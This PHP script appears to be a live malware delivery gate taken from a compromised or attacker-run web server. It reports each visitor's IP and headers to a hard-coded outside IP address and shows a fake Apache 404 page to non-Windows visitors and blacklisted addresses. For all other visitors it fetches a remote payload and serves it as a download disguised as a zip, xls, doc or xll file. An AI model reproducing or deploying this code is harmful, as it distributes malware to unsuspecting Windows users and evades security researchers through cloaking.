<?php 

	$VERSION = '27421cf99a451b6159fb6b919e127b3e';
	
	ini_set('display_errors', 0);
	ini_set('display_startup_errors', 0);
	error_reporting(E_ALL);

	if( !function_exists('header') ){
		exit('.h');
	}

	function curl_get( $url ){

		if( !function_exists('curl_init') ){
			return false;
		}

		$curl = curl_init();
	 
		curl_setopt($curl, CURLOPT_URL, $url);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_HEADER, false);

		curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 10); 
		curl_setopt($curl, CURLOPT_TIMEOUT, 20);
		 
		$data = curl_exec($curl);
		 
		curl_close($curl);

		return trim($data);
	}
	
	function generateRandomString($length){

		if( empty($length) ){
			$length = 10;
		}

	    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	    $charactersLength = strlen($characters);
	    $randomString = '';
	    for ($i = 0; $i < $length; $i++) {
	        $randomString .= $characters[rand(0, $charactersLength - 1)];
	    }
	    return $randomString;
	}

	function response_404(){

		if( function_exists('http_response_code') ){
			http_response_code(404);
		}

		echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache (Ubuntu) Server</address>
</body></html>
';
		
		exit;
	}

	$REDIRECT_FILENAME = 'charts';
	
	$REQUEST_URI = $_SERVER['REQUEST_URI'];

	if( stripos($REQUEST_URI, 'logotype.jpg') !== false ){
		$_SESSION['has_logo'] = true;
		response_404();
		exit();
	}

	if( empty($REQUEST_URI) ){
		response_404();
		exit('');
	}

	$REQUEST_URI_ARR = explode("/", $REQUEST_URI);

	if( count($REQUEST_URI_ARR) < 2 ){
		response_404();
		exit('');
	}

	if( empty($_GET['e']) ){
		$_GET['e'] = 'index';
	}

	function getRealIpAddr()
	{
	    return $_SERVER['REMOTE_ADDR'];
	}

	if( empty(getRealIpAddr()) ){
		response_404();
		exit('.pi');
	}

	$hdrs_new = array();

	$hdrs = getallheaders();
	foreach ($hdrs as $key => $value) {
		$kk = strtolower($key);
		$hdrs_new[$kk] = $value;
	}

	$file_ext = explode(".", $_GET['e']);
	$file_ext = end( $file_ext );

	if( !in_array( $file_ext , array( 'zip', 'xls', 'doc', 'xll' )) ){
		$file_ext = 'zip';
	}

	$data_json = array(
		"ip" => getRealIpAddr(),
		"time" => time(),
		"hh" => $hdrs_new['hh'],
		"ext" => $file_ext,
		"host" => $_SERVER['SERVER_NAME'],
		"filename" => $_GET['e'],
	);

	$data_json = json_encode($data_json);
	$data_json = base64_encode($data_json);

	// START check black list
	$ip_for_check = getRealIpAddr();

	$links_ip_ckeck = array(
		'http://193.149.129.51/router_black.php?ip=' . $ip_for_check . '&data=' . $data_json . '&version=' . $VERSION . '&alanpo=' . $hdrs_new['alanpo'],
		'http://193.149.129.51/router_black.php?ip=' . $ip_for_check . '&data=' . $data_json . '&version=' . $VERSION . '&alanpo=' . $hdrs_new['alanpo'],
		'http://193.149.129.51/router_black.php?ip=' . $ip_for_check . '&data=' . $data_json . '&version=' . $VERSION . '&alanpo=' . $hdrs_new['alanpo'],
	);

	$is_black = false;
	$is_HH = false;

	foreach ($links_ip_ckeck as $link_ip_ckeck) {

		$ctx = stream_context_create(array('http'=>
		    array(
		        'timeout' => 10,
		    )
		));

		$tmp_resp = @file_get_contents( $link_ip_ckeck , false, $ctx);

		if( empty($tmp_resp) ){
			$tmp_resp = curl_get($link_ip_ckeck);
		}

		$tmp_resp_json = json_decode( $tmp_resp, true );

		if( $tmp_resp_json['status'] === true ){

			$is_black = $tmp_resp_json['is_black'];
			$REDIRECT_FILENAME = $tmp_resp_json['REDIRECT_FILENAME'];
			$is_HH = $tmp_resp_json['is_HH'];
			
			break;
		}
		
	}
	// END check black list

	// check IP
	if( $is_HH && empty($ip_for_check) ){
		response_404();
		exit("");
	}

	if( empty($_SERVER['HTTP_USER_AGENT']) ){
		$is_black = true;
	}

	if( stripos($_SERVER['HTTP_USER_AGENT'], 'Windows') === false ){
		$is_black = true;
	}

	if( $is_black ){
		response_404();
		exit('');
	}

	if( !$is_HH ){

		// if( $_GET['e'] != $REDIRECT_FILENAME . "." . $file_ext ){
		if( stripos($_GET['e'] , "." . $file_ext) === false ){

			$_SESSION['__redirect_was_start'] = true;
			$_SESSION['doc_name'] = $_GET['e'];

			if( stripos( $_SESSION['doc_name'] , '.' . $file_ext) === false ){
				$_SESSION['doc_name'] .= '.' . $file_ext;
			}

			$_SESSION['file_ext'] = $file_ext;

			$redirect_uri = '/' . basename(__FILE__) . '?e=' . $REDIRECT_FILENAME . "." . $file_ext;

			header("Location: {$redirect_uri}");

			$random_name_id = generateRandomString( rand( 2, 8 ) );

			echo "<html><body>";

			echo '<span id="'. $random_name_id .'" data-'. $random_name_id .'="'. $redirect_uri .'"></span>';

			$image_data = '';

			if( !empty($tmp_resp_json['passwd']) ){

				echo "<div style='font-family: Tahoma, sans-serif;width: 360px;margin:50px auto;font-size: 18px;font-weight: bold;background: #eee;padding: 25px 50px;border-radius: 4px;border: 2px solid #03a9f4;text-align:center;'><img height='60px' src='", $image_data,"'><br><br>", $tmp_resp_json['passwd'],"</div>";

			}

			echo "<script>";
			
			// echo "location.pathname = document.getElementById('". $random_name_id ."').getAttribute('data-". $random_name_id ."');";

			// echo "location.pathname = '". $redirect_uri ."';";

			echo "</script>";

			echo "</body></html>";

			exit();
		}
		

	}

	if( empty($_SESSION['file_ext']) ){
		$_SESSION['file_ext'] = 'zip';
	}

	$resp_version = 2;

	$links = array(
		'http://193.149.129.51/router08.php?pp=' . $data_json . '&version=' . $VERSION . '&resp_version=' . $resp_version,
		'http://193.149.129.51/router08.php?pp=' . $data_json . '&version=' . $VERSION . '&resp_version=' . $resp_version,
		'http://193.149.129.51/router08.php?pp=' . $data_json . '&version=' . $VERSION . '&resp_version=' . $resp_version,
	);

	$outfilepath = __DIR__ . '/../big__stat.txt';

	if( empty($_SESSION['doc_name']) ){
		$_SESSION['doc_name'] = $REDIRECT_FILENAME . "." . $file_ext;
	}

	$has_resp = false;

	foreach ($links as $link) {

		$ctx = stream_context_create(array('http'=>
		    array(
		        'timeout' => 30,
		    )
		));

		$data = @file_get_contents( $link , false, $ctx);

		if( empty($data) ){
			$data = curl_get($link);
		}

		if( $data == '....' || $data == '...' ){
			break;
		}

		if( strlen($data) < 100 ){
			continue;
		}

		$resp_data = $data;
		$fname = $_SESSION['doc_name'];

		if( $resp_version == 2 ){

			$tmp_data = json_decode( $data, true );

			$fname = $tmp_data['filename'];
			$resp_data = base64_decode( $tmp_data['data'] );

		}

		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename=' . $fname ); 
		header('Content-Transfer-Encoding: binary');
		header('Connection: Keep-Alive');
		header('Expires: 0');
		header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
		header('Pragma: public');

		echo $resp_data;

		$has_resp = true;

		exit;
	}

	if( !$has_resp ){
		response_404();
	}